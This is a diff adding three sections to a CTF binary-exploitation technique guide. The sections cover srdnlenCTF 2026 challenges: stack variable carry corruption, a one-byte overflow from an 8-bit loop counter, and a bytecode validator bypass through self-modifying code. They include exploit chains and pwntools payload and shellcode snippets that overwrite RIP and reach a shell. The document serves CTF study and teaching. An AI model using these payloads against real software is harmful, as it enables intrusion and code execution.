@@ -32,6 +32,9 @@
 - [VM GC-Triggered UAF — Slab Reuse (EHAX 2026)](#vm-gc-triggered-uaf-slab-reuse-ehax-2026)
 - [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
 - [FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)](#fsop--seccomp-bypass-via-openatmmapwrite-ehax-2026)
+- [Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)](#stack-variable-overlap--carry-corruption-oob-srdnlenctf-2026)
+- [1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)](#1-byte-overflow-via-8-bit-loop-counter-srdnlenctf-2026)
+- [Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)](#bytecode-validator-bypass-via-self-modification-srdnlenctf-2026)
 - [Kernel Exploitation](#kernel-exploitation)
 
 ---
@@ -755,6 +758,91 @@ rop.raw(libc.sym.write)
 | `read` | `readv` | 19 |
 | `write` | `writev` | 20 |
 | `write` | `sendfile` | 40 |
+
+---
+
+## Stack Variable Overlap / Carry Corruption OOB (srdnlenCTF 2026)
+
+**Pattern (common_offset):** Stack variables share storage due to compiler layout. Carry from arithmetic on one variable corrupts an adjacent variable, enabling OOB access.
+
+**Vulnerability:** `index` (byte at `[rsp+0x49]`) and `offset` (word at `[rsp+0x48]`) share storage. Incrementing `offset` by 255 causes a carry that corrupts `index` from 3 to 4, producing out-of-bounds table access.
+
+**Exploit chain:**
+1. Set index=0, increment offset by 1 to establish baseline
+2. Set index=3, increment offset by 255 → carry corrupts index to 4
+3. OOB access on table retrieves saved RIP from stack frame
+4. Overwrite RIP to trigger `read_stdin` again, landing on stack gadget
+5. Two-stage ROP: leak `puts@GOT`, compute libc base, then `setcontext` for code execution
+
+**Key insight:** When variables of different sizes are packed adjacent on the stack (e.g., byte immediately after word), arithmetic overflow on the smaller-address variable carries into the larger-address variable. This is subtle in disassembly — look for overlapping `[rsp+N]` accesses with different operand sizes.
+
+**Detection:** In disassembly, check if two named variables share partially overlapping stack offsets. For example, a `word` at `rsp+0x48` and a `byte` at `rsp+0x49` — the high byte of the word IS the byte variable.
+
+---
+
+## 1-Byte Overflow via 8-bit Loop Counter (srdnlenCTF 2026)
+
+**Pattern (Echo):** Custom `read_stdin()` uses 8-bit loop counter that wraps around, writing 65 bytes to a 64-byte buffer, overflowing into an adjacent size variable.
+
+**Progressive leak technique:**
+1. Trigger 1-byte overflow to increase buffer size from 0x40 to 0x48
+2. With enlarged buffer, read further on stack — leak canary and saved rbp
+3. Increase size to 0x77 to leak main's libc return address from stack
+4. Compute libc base from leaked return address offset
+5. Craft final payload: restore canary, set fake rbp, overwrite RIP with one-gadget
+
+**One-gadget constraint setup:**
+```python
+from pwn import *
+
+# Stack layout: buffer[rbp-0x50], size[rbp-0x10], canary[rbp-0x08], rbp, ret
+# One-gadget needs NULL at [rbp-0x78] and [rbp-0x60]
+buf_addr = leaked_rbp - 0x50  # known from leak
+fake_rbp = buf_addr + 0x78
+
+payload = b"\x00" * 8          # [fake_rbp - 0x78] = NULL (constraint)
+payload += b"A" * 16
+payload += b"\x00" * 8          # [fake_rbp - 0x60] = NULL (constraint)
+payload = payload.ljust(64, b"A")
+payload += p64(0x48)            # preserve enlarged size
+payload += p64(canary)          # restore canary
+payload += p64(fake_rbp)        # fake rbp satisfying constraints
+payload += p64(one_gadget)      # libc one-gadget
+```
+
+**Key insight:** 8-bit counters in read loops cause off-by-one when the buffer size equals the counter's range (64 → wraps after 64, writes byte 65). The 1-byte overflow into a size field creates a progressive information disclosure primitive: each round leaks more stack data, enabling a full exploit chain from a single-byte overflow.
+
+---
+
+## Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)
+
+**Pattern (Registered Stack):** Bytecode validator only checks initial bytes; runtime self-modification converts validated instructions into forbidden ones (e.g., `push fs` → `syscall`).
+
+**Key technique:** `push fs` encodes as `0f a0`, and `syscall` as `0f 05`. The validator accepts `push fs`, but at runtime a preceding `push rbx` overwrites the `a0` byte with `05` on the stack, turning it into `syscall`.
+
+**Exploit structure:**
+1. Use `pop` instructions to adjust rsp to a predictable memory bucket (~1/16 probability due to ASLR)
+2. Seed specific stack values for `pop sp` instruction (pivots to controlled location)
+3. Place `syscall` gadget disguised as `push fs` with self-modifying byte mutation
+4. Use `read(0, stage2_buf, size)` syscall to load stage 2
+5. Stage 2 contains interactive shell code
+
+```python
+code = []
+code += [0x59] * 30              # pop rcx x30 → rsp += 0xf0
+code += [0x66, 0x5c]             # pop sp → pivot to seeded value
+code += [0x50] * 17              # push rax x17 (adjust stack)
+code += [0x66, 0x50]             # push ax
+code += [0x66, 0x54, 0x66, 0x5b] # push sp; pop bx (rbx = count for read)
+code += [0x50] * 66              # push rax x66
+code += [0x66, 0x59]             # pop cx
+code += [0x53]                   # push rbx → overwrites next byte!
+# Following bytes: 0x54 0x5e 0x53 0x5a 0x54 0x0f 0xa0
+# After push rbx mutates 0xa0 → 0x05: becomes syscall
+code += [0x54, 0x5e, 0x53, 0x5a, 0x54, 0x0f, 0xa0]
+```
+
+**Key insight:** Bytecode validators that only check the instruction stream statically are vulnerable to self-modification at runtime. Look for instruction pairs where one byte difference changes the instruction's semantics (e.g., `0f a0` → `0f 05`). Use preceding instructions to write the mutation byte onto the stack/code region.
 
 ---
 
